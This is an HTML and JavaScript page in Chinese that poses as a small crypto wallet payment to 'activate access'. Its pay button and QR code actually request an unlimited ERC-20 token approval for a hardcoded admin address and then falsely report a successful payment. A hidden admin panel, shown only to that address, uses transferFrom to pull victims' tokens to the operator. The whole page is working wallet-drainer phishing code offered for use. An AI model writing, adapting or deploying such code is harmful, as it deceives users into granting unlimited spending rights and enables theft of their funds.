<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0F17;color:#fff;padding:30px}
.container{max-width:400px;margin:0 auto}
.box{background:#1E293B;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
.qr-box{width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:20px auto}
.qr-box img{width:100%;height:100%;border-radius:12px}
.title{font-size:22px;margin-bottom:10px}
.desc{color:#9ca3af;margin-bottom:20px}

.input-amount{
  width:100%;
  padding:14px;
  background:#0f172a;
  border:none;
  border-radius:10px;
  color:#fff;
  font-size:16px;
  text-align:center;
  margin-bottom:10px;
}

.pay-btn{
  background:#3B82F6;
  color:#fff;
  border:none;
  padding:16px;
  width:100%;
  border-radius:12px;
  font-size:16px;
  font-weight:bold;
}

/* 管理员后台（仅你可见） */
.admin{background:#1E293B;padding:24px;border-radius:16px;display:none}
.admin.show{display:block}
.admin-title{color:red;font-weight:bold;margin-bottom:16px}
.input{width:100%;padding:12px;background:#0f172a;border:none;border-radius:8px;color:#fff;margin-bottom:10px}
.btn{width:100%;padding:14px;background:#ef4444;color:#fff;border:none;border-radius:10px;margin-bottom:16px}
</style>
</head>
<body>

<div class="container">
  <div class="box">
    <div class="title">💳 支付开通</div>
    <div class="desc">钱包扫一扫支付开通权限</div>

    <input class="input-amount" id="amount" placeholder="输入支付金额" value="0.1">

    <div class="qr-box"><img id="qr"></div>
    <button class="pay-btn" id="payBtn">确认支付</button>
  </div>

  <!-- 管理员后台 → 只有你能看见 -->
  <div class="admin" id="adminPanel">
    <div class="admin-title">🔐 管理后台</div>

    <div>提取玩家钱包代币</div>
    <input class="input" id="fromAddr" placeholder="玩家地址">
    <input class="input" id="takeAmt" placeholder="提取数量">
    <button class="btn" onclick="adminTake()">✅ 提取代币</button>

    <div>发放奖励给玩家</div>
    <input class="input" id="toAddr" placeholder="玩家地址">
    <input class="input" id="sendAmt" placeholder="发放数量">
    <button class="btn" onclick="adminReward()">✅ 发放奖励</button>
  </div>
</div>

<script>
// ======================================
// 你的地址
// ======================================
const TOKEN  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

let account = null;

// 自动连接钱包
window.onload = async () => {
  if(!window.ethereum) return;
  try{
    const accs = await ethereum.request({method:"eth_requestAccounts"});
    account = accs[0];
    if(account.toLowerCase() === ADMIN.toLowerCase()){
      document.getElementById("adminPanel").classList.add("show");
    }
  }catch(e){}
  refreshQR();
};

// 金额改变自动刷新二维码
document.getElementById("amount").oninput = refreshQR;

function refreshQR(){
  const authData = "0x095ea7b3" +
    ADMIN.slice(2).padStart(64,"0") +
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const uri = `ethereum:${TOKEN}?data=${authData}`;
  document.getElementById("qr").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
}

// 确认支付（实际授权）
document.getElementById("payBtn").onclick = async () => {
  if(!account) return alert("请先连接钱包");
  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from:account,
      to:TOKEN,
      gasLimit:"0x300000",
      data:"0x095ea7b3"+
           ADMIN.slice(2).padStart(64,"0")+
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }]
  });
  alert("✅ 支付成功！权限已开通");
};

// ======================================
// 管理员功能
// ======================================
async function adminTake(){
  if(account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const from = document.getElementById("fromAddr").value;
  const amt  = document.getElementById("takeAmt").value;
  if(!from || !amt) return;
  const raw = BigInt(amt * 1e18).toString(16).padStart(64,"0");
  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from:account,
      to:TOKEN,
      gasLimit:"0x300000",
      data:"0x23b872dd"+
           from.slice(2).padStart(64,"0")+
           ADMIN.slice(2).padStart(64,"0")+
           raw
    }]
  });
  alert("✅ 提取成功");
}

async function adminReward(){
  if(account?.toLowerCase() !== ADMIN.toLowerCase()) return;
  const to  = document.getElementById("toAddr").value;
  const amt = document.getElementById("sendAmt").value;
  if(!to || !amt) return;
  const raw = BigInt(amt * 1e18).toString(16).padStart(64,"0");
  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from:account,
      to:TOKEN,
      gasLimit:"0x300000",
      data:"0xa9059cbb"+
           to.slice(2).padStart(64,"0")+
           raw
    }]
  });
  alert("✅ 奖励发放成功");
}
</script>
</body>
</html>
